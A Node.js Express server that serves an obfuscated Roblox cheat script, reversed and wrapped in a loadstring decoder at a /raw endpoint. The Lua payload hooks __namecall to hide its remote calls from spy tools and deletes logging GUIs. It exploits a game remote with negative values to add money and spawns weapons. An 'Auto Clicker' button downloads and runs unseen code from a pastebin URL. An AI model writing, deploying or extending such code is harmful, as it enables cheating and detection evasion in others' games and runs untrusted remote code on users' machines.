const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

const myScript = `
-- [ نظام حماية البيانات - Remote Spoofing ]
local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    
    -- إذا حاول أي سكربت (مثل Spy) التجسس على هذا الأمر بالذات
    if tostring(self) == "RequestTool" and method == "FireServer" then
        -- نرسل له بيانات وهمية تماماً (nil) بينما البيانات الحقيقية تذهب للسيرفر
        return oldNamecall(self, unpack({nil, nil})) 
    end
    
    return oldNamecall(self, ...)
end)

-- [ منع التجسس بالبحث عن الواجهات ]
task.spawn(function()
    while task.wait(1) do
        for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
            if v.Name:lower():find("spy") or v.Name:lower():find("log") then
                v:Destroy()
            end
        end
    end
end)

local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local MainFrame = Instance.new("Frame", ScreenGui)
local TopBar = Instance.new("Frame", MainFrame)
local Title = Instance.new("TextLabel", TopBar)
local TabsFrame = Instance.new("Frame", MainFrame)
local ContentFrame = Instance.new("Frame", MainFrame)
local MinimizeBtn = Instance.new("TextButton", ScreenGui)

-- [ إعدادات القائمة ]
MainFrame.Size = UDim2.new(0, 350, 0, 300)
MainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.Visible = true
MainFrame.Active = true
MainFrame.Draggable = true
Instance.new("UICorner", MainFrame)

MinimizeBtn.Parent = ScreenGui
MinimizeBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
MinimizeBtn.Position = UDim2.new(0, 10, 0.4, 0)
MinimizeBtn.Size = UDim2.new(0, 50, 0, 50)
MinimizeBtn.Text = "Open"
MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
Instance.new("UICorner", MinimizeBtn).CornerRadius = UDim.new(1, 0)

TopBar.Size = UDim2.new(1, 0, 0, 35)
TopBar.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Title.Size = UDim2.new(1, 0, 1, 0)
Title.Text = "Secure Script v4"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)

local function CreateTab(tabName)
    local page = Instance.new("ScrollingFrame", ContentFrame)
    page.Size = UDim2.new(1, 0, 1, 0)
    page.BackgroundTransparency = 1
    page.Visible = false
    page.ScrollBarThickness = 2
    Instance.new("UIListLayout", page).Padding = UDim.new(0, 8)
    
    local btn = Instance.new("TextButton", TabsFrame)
    btn.Size = UDim2.new(1, 0, 0, 35)
    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    btn.Text = tabName
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", btn)
    
    btn.MouseButton1Click:Connect(function()
        for _, p in pairs(ContentFrame:GetChildren()) do p.Visible = false end
        page.Visible = true
    end)
    return page
end

local TabFarm = CreateTab("Farm")
local TabSpawn = CreateTab("Spawn")

local function AddButton(parent, text, callback)
    local b = Instance.new("TextButton", parent)
    b.Size = UDim2.new(1, -10, 0, 40)
    b.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
    b.Text = text
    b.TextColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(callback)
end

local AmountInput = Instance.new("TextBox", TabFarm)
AmountInput.Size = UDim2.new(1, -10, 0, 40)
AmountInput.PlaceholderText = "Amount"
AmountInput.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
AmountInput.TextColor3 = Color3.fromRGB(255, 255, 255)
Instance.new("UICorner", AmountInput)

AddButton(TabFarm, "Add Money", function()
    local val = tonumber(AmountInput.Text)
    if val then
        game:GetService("ReplicatedStorage").RequestTool:FireServer("Desert Deagle", -math.abs(val))
    end
end)

AddButton(TabFarm, "Auto Clicker", function() 
    loadstring(game:HttpGet("https://pastebin.com/raw/eR1HPXfw"))() 
end)

local items = {
    {"M4", "M4A1"}, {"Deagle", "Desert Deagle"}, {"Handcuffs", "Handcuffs"},
    {"Radio", "Radio"}, {"Ammo", "AmmoBox"}, {"Packet", "Filled Packet"},
    {"FiveSeven", "FiveSeven"}, {"Heavy Vest", "Heavy Vest"}
}
for _, item in pairs(items) do
    AddButton(TabSpawn, item[1], function() game:GetService("ReplicatedStorage").RequestTool:FireServer(item[2], 0) end)
end

TabFarm.Visible = true
MinimizeBtn.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)
`;

app.get('/raw', (req, res) => {
    const encoded = myScript.split("").reverse().join("");
    const finalWrapper = `local d="${encoded.replace(/"/g, '\\"').replace(/\n/g, '\\n')}" local function r(s) local res="" for i=#s,1,-1 do res=res..s:sub(i,i) end return res end loadstring(r(d))()`;
    res.set('Content-Type', 'text/plain');
    res.send(finalWrapper);
});

app.get('/', (req, res) => res.send('Stealth Mode Active'));
app.listen(PORT, () => console.log('Server Ready'));
